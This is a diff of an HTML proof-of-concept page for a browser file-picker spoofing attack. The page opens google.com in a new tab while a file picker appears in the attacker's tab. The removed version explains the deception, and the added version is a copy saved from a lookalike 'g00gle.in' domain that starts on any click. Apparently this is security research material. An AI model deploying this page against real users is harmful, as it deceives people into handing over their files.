@@ -1,84 +1,69 @@
-<!doctype html>
-<html lang="en">
+<!-- saved from url=(0035)https://g00gle.in/chromepicker.html -->
+<html class="hydrated">
   <head>
-    <meta charset="UTF-8" />
-    <title>PoC: File Picker Spoofing via Tab Redirection</title>
-    <style>
-      body {
-        font-family: sans-serif;
-        padding: 2rem;
-        text-align: center;
-        background: #f0f2f5;
-      }
-      .btn {
-        background: #1a73e8;
-        color: white;
-        border: none;
-        padding: 12px 24px;
-        font-size: 1.2rem;
-        border-radius: 8px;
-        cursor: pointer;
-      }
-      .note {
-        margin-top: 2rem;
-        font-size: 0.9rem;
-        color: #555;
-      }
-      input {
-        display: none;
-      }
-    </style>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />
+    <style type="text/css" id="operaUserStyle"></style>
+    <script
+      src="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-email-notifier/sqrx-email-notifier.esm.js"
+      type="module"
+      data-resources-url="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-email-notifier/"
+      data-stencil-namespace="sqrx-email-notifier"
+      id="sqrx-email-notifier"
+    ></script>
+    <script
+      src="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-dialog/sqrx-dialog.esm.js"
+      type="module"
+      data-resources-url="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-dialog/"
+      data-stencil-namespace="sqrx-dialog"
+      id="sqrx-dialog"
+    ></script>
+    <script
+      src="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-notification-bar/sqrx-notification-bar.esm.js"
+      type="module"
+      data-resources-url="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-notification-bar/"
+      data-stencil-namespace="sqrx-notification-bar"
+      id="sqrx-notification-bar"
+    ></script>
   </head>
-  <body>
-    <h2>📸 Upload Photo to Google (Demo)</h2>
-    <p>
-      Click the button below. A new tab will open <strong>google.com</strong>.
-    </p>
-    <p>
-      After that, a file picker dialog will appear
-      <strong>in this tab</strong> (the attacker's page).
-    </p>
-    <p>
-      Victim thinks the file is being uploaded to Google, but it's actually sent
-      to attacker.
-    </p>
-
-    <button class="btn" id="triggerBtn">
-      📤 Tap to upload photo to Google
-    </button>
-
-    <div class="note">
-      ⚠️ PoC for security research only. No file is actually uploaded.
-    </div>
-
-    <input type="file" id="fileInput" style="display: none" />
+  <body align="center" onclick="load()" style="color: red; font-size: 24px">
+    Click Here
 
     <script>
-      const btn = document.getElementById("triggerBtn");
-      const fileInput = document.getElementById("fileInput");
+      async function load() {
+        window.handle = window.showOpenFilePicker();
+        window.open("https://google.com", "_blank");
+        window.handle = (await window.handle)[0];
+        await window.handle.requestPermission();
+        // ...
+        previewImage();
+      }
 
-      btn.addEventListener("click", (e) => {
-        // 1. Open a new tab (google.com) – this simulates the trusted site
-        const newTab = window.open("https://www.google.com", "_blank");
-
-        // 2. Trigger file picker dialog in the current (attacker) tab
-        //    Use setTimeout to ensure the new tab is opened first
-        setTimeout(() => {
-          fileInput.click();
-        }, 100);
-
-        // 3. (Optional) handle file selection for demonstration
-        fileInput.onchange = (event) => {
-          const file = event.target.files[0];
-          if (file) {
-            alert(
-              `[PoC] File "${file.name}" would be uploaded to attacker's server.`,
-            );
-            // In a real attack, you would send this file via fetch/FormData
-          }
-          fileInput.value = ""; // reset
-        };
-      });
+      async function previewImage() {
+        const file = await window.handle.getFile();
+        if (file.type.startsWith("image/")) {
+          const reader = new FileReader();
+          reader.onload = function (event) {
+            const imgElement = document.createElement("img");
+            imgElement.src = event.target.result;
+            document.body.appendChild(imgElement);
+          };
+          reader.readAsDataURL(file);
+        } else {
+          alert("Please choose an image file.");
+        }
+      }
     </script>
+
+    <div id="sqrx-content-container">
+      <div class="squarex_ext_modal">
+        <div class="squarex_ext_dialog-container">
+          <div id="module_dialog_root__disposableFileViewer">
+            <div
+              class="squarex_ext_dialog squarex_ext_light squarex_ext__hidden"
+            ></div>
+          </div>
+        </div>
+      </div>
+    </div>
   </body>
 </html>
